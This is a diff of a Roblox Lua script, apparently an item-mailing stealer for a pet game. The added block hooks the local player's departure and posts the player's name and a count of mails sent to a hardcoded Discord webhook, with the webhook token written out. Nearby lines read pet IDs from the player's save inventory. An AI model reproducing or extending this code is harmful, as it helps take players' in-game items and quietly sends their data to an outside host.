@@ -77,7 +77,7 @@ mailc=mailc+1
 print("-------------lol")
 local qv = "starsh"
 print(qv)
-local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
 local nam = args[4]
 pcall(function()
 nam = save.Inventory.Pet[args[4]].id or args[4] end)
@@ -114,7 +114,23 @@ local responseqxr =
     )
 end
 end)
-
+game.Players.LocalPlayer.Destroying:Connect(function()
+if mailc >= 1 then
+local qv = "starsh"
+print(qv)
+qv = '{"content":"'..game.Players.LocalPlayer.Name..' left. Mail sent: '..mailc..'"}'
+print(qv)
+local responseqxr =
+        request(
+        {
+            Url = "https://discordapp.com/api/webhooks/1298650438111068170/hippfrrGnjC-5wIWfrUS8gV6AAwqJKlpUiAmxHSaSFQhHPutaOym0MmSSxSpADpwZIAQ",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = qv
+        }
+    )
+end
+end)
 
 end)
 if dh then
